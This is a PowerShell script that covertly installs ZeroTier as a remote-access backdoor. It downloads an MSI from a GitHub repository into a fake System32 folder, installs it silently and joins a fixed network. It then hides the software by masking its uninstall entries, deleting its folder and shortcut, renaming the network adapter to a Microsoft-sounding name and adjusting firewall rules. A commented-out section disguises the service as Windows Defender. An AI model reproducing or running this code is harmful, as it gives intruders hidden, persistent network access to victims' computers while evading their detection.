$ErrorActionPreference = "SilentlyContinue"
$downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/CorePrograms/MeshNetwork.msi"
$hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
$downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
$programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
$allUserProfiles = Get-WmiObject Win32_UserProfile | Where-Object { $_.Special -eq $false }
$destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
##Code starts Here
#Cleanup
Install-PackageProvider -Name NuGet -Force | Out-Null
Uninstall-Package -Name "ZeroTier One" -Force | Out-Null
if (-not (Test-Path (Split-Path $destinationPath))) {
    New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
}
foreach ($userProfile in $allUserProfiles) {
    $profilePath = $userProfile.LocalPath
    $username = $userProfile.LocalPath.Split('\')[-1]
    if ($username -ne "SYSTEM" -and $username -ne "NT AUTHORITY") {
        if (Test-Path -Path $profilePath) {
            $zeroTierPath = Join-Path -Path $profilePath -ChildPath "AppData\Local\ZeroTier"
            if (Test-Path -Path $zeroTierPath -PathType Container) {
                Remove-Item -Path $zeroTierPath -Recurse -Force
            }
        }
    }
}
#File integrity check
if (Test-Path $destinationPath) {
    $existingFileHash = (Get-FileHash -Path $destinationPath -Algorithm SHA256).Hash
    $hashesData = (iwr -Uri $hashesUrl -UseBasicParsing).Content
    $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"
    if ($hashesData -match $hashRegex) {
        $programHash = $matches[1]
    }
    if ($programHash -eq $existingFileHash) {
        Write-Host "File is already present and matches the hash. No action needed." | Out-Null
    } else {
        Remove-Item -Path $destinationPath -Force
    }
}
if (-not (Test-Path $destinationPath)) {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
}
#Installation
Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$destinationPath`" /qn /norestart"
Timeout /NoBreak 20
Stop-Process -Name zerotier_desktop_ui -F -ErrorAction SilentlyContinue | Out-Null
Timeout /NoBreak 15
$NetworkID = "52b337794f5f54e7"
$zerotiercli = "C:\ProgramData\ZeroTier\One\zerotier-one_x64.exe"
$param1 = "-q"
$param2 = "join"
$NetworkID = "52b337794f5f54e7"
& $zerotiercli $param1 $param2 $NetworkID allowDefault=1
$KeyNamePattern = "Zerotier*"
$RegPath = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
$MatchingKeys = Get-ChildItem -Path $RegPath | Where-Object { $_.PSChildName -like $KeyNamePattern }
foreach ($Key in $MatchingKeys) {
$RegKeyPath = Join-Path -Path $RegPath -ChildPath $Key.PSChildName
$RegValueName = "SystemComponent"
$RegValueData = 1
Set-ItemProperty -Path $RegKeyPath -Name $RegValueName -Value $RegValueData -Type DWORD -Force
Set-NetConnectionProfile -InterfaceAlias "ZeroTier*" -NetworkCategory Private
}
$ZeroTierShortcutPath = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Zerotier.lnk'
if (Test-Path $ZeroTierShortcutPath) {
Remove-Item -Path $ZeroTierShortcutPath -Force -ErrorAction SilentlyContinue | Out-Null
}
$folderPath = "C:\Program Files (x86)\ZeroTier"
$folderACL = Get-Acl -Path $folderPath
$folderACL.SetAccessRuleProtection($true, $false)
$folderACL.Access | ForEach-Object {
$folderACL.RemoveAccessRule($_)
}
Set-Acl -Path $folderPath -AclObject $folderACL
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$folderACL.SetOwner([System.Security.Principal.NTAccount] $currentUser)
Set-Acl -Path $folderPath -AclObject $folderACL
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
$currentUser,
"FullControl",
"ContainerInherit, ObjectInherit",
"None",
"Allow"
)
$folderACL.AddAccessRule($accessRule)
Set-Acl -Path $folderPath -AclObject $folderACL
$childItems = Get-ChildItem -Path $folderPath -Recurse
foreach ($item in $childItems) {
Set-Acl -Path $item.FullName -AclObject $folderACL
}
Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
$adapterNameToRename = "Zerotier*"
$newAdapterName = "Microsoft Teredo IPv6 Tunneling Interface"
$maxRetries = 3
$retryCount = 0
while ($retryCount -lt $maxRetries) {
    try {
        $adapter = Get-NetAdapter -Name $adapterNameToRename
        if ($adapter) {
            Rename-NetAdapter -InputObject $adapter -NewName $newAdapterName
            break  # Exit the loop on success
        } else {
            break  # Exit the loop if the adapter is not found
        }
    } catch {
        $retryCount++
        Start-Sleep -Seconds 5  # Add a delay before the next retry
    }
}
$AppNamePattern = "ZeroTier*"
$Rules = Get-NetFirewallRule | Where-Object { $_.DisplayName -like $AppNamePattern }
$ProfileType = "Private"
if ($Rules.Count -gt 0) {
    foreach ($Rule in $Rules) {
        $Rule.Profile = $ProfileType
        Set-NetFirewallRule -InputObject $Rule | Out-Null
    }
} else {}
#Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Network\NewNetworkWindowOff" -Force | Out-Null
#ZT Adv Fix
#$ztadv = Read-Host "Proceed With ZT Adv Fix (y/n)"
#if ([string]::IsNullOrEmpty($ztadv)) {
#    Start-Sleep -Seconds 1
#    $ztadv = "n"	
#}
#if ($ztadv.ToLower() -eq "y") {
#    Write-Host "Executing ZT Adv Fix..."
#	$ztregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\ZeroTierOneService"
#	Set-ItemProperty -Path $ztregkey -Name "DisplayName" -Value "Windows Defender Core Service"
#	Set-ItemProperty -Path $ztregkey -Name "Description" -Value "Windows Defender Essential Services"
#	$ruleName = "ZeroTier x64 Binary In"
#	$existingRule = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName }
#	if ($existingRule) {
#		$newRuleName = "Windoes Defender Core Service"
#		Set-NetFirewallRule -DisplayName $ruleName -NewDisplayName $newRuleName -ErrorAction SilentlyContinue
#		Set-NetFirewallRule -DisplayName $newRuleName -ErrorAction SilentlyContinue
#	}
#	$ruleName2 = "ZeroTier UDP/9993 In"
#	$existingRule2 = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName2 }
#	if ($existingRule2) {
#		$newRuleName2 = "Windows Defender Service"
#		Set-NetFirewallRule -DisplayName $ruleName2 -NewDisplayName $newRuleName2 -ErrorAction SilentlyContinue
#		Set-NetFirewallRule -DisplayName $newRuleName2 -ErrorAction SilentlyContinue
#	}	
#	Restart-Service ZeroTierOneService
#} else {
#}
